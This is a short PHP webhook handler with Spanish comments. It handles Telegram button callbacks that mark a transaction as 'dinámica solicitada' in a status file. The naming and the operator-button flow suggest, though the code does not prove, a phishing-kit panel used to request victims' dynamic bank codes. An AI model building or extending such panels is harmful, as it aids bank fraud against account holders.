<?php
// webhook_handler.php para data-ps - Maneja callbacks de Telegram
header('Content-Type: application/json');

try {
    // Obtener el contenido del webhook
    $input = file_get_contents('php://input');
    $update = json_decode($input, true);

    if (!$update) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
        exit;
    }

    // Log del webhook recibido
    file_put_contents('webhook_log.txt', date('Y-m-d H:i:s') . " - Webhook: " . $input . "\n", FILE_APPEND);

    // Procesar callback_query (botones inline)
    if (isset($update['callback_query'])) {
        $callbackQuery = $update['callback_query'];
        $callbackData = $callbackQuery['data'];
        $chatId = $callbackQuery['message']['chat']['id'];

        // Log del callback
        file_put_contents('callback_log.txt', date('Y-m-d H:i:s') . " - Callback: " . $callbackData . "\n", FILE_APPEND);

        // Verificar si es un callback de solicitar dinamica
        if (strpos($callbackData, 'solicitar_dinamica_') === 0) {
            // Extraer transactionId del callback data
            $transactionId = str_replace('solicitar_dinamica_', '', $callbackData);

            // Actualizar el archivo de estado
            $statusFile = 'dinamica_status.json';
            $statusData = [
                'transactionId' => $transactionId,
                'status' => 'dinamica_solicitada',
                'timestamp' => time()
            ];

            file_put_contents($statusFile, json_encode($statusData));

            // Log de actualización de estado
            file_put_contents('status_log.txt', date('Y-m-d H:i:s') . " - Status updated to dinamica_solicitada for transaction: " . $transactionId . "\n", FILE_APPEND);

            // Responder al callback de Telegram
            $response = [
                'method' => 'answerCallbackQuery',
                'callback_query_id' => $callbackQuery['id'],
                'text' => 'Dinámica solicitada correctamente',
                'show_alert' => false
            ];

            echo json_encode($response);
            exit;
        }
    }

    // Responder OK para otros tipos de updates
    echo json_encode(['status' => 'ok']);

} catch (Exception $e) {
    file_put_contents('error_log.txt', date('Y-m-d H:i:s') . " - Error: " . $e->getMessage() . "\n", FILE_APPEND);
    echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
}
?>